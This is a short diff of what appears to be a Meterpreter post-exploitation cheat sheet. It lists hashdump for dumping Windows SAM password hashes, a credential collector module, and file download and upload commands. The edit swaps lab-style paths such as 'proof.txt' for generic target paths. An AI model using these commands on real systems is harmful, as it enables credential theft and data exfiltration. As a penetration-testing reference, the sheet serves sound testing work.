@@ -93,8 +93,8 @@ hashdump          # dump local SAM hashes (needs SYSTEM)
 run post/windows/gather/credentials/credential_collector
 
 # File operations
-download C:\Users\Administrator\Desktop\proof.txt    # download file
-upload /kali/path/file.exe C:\temp\file.exe          # upload file
+download C:\Users\Administrator\Documents\target_file.txt    # download file
+upload /local/path/tool.exe C:\Windows\Temp\tool.exe         # upload file
 ls                # list directory
 cd C:\\Users
 
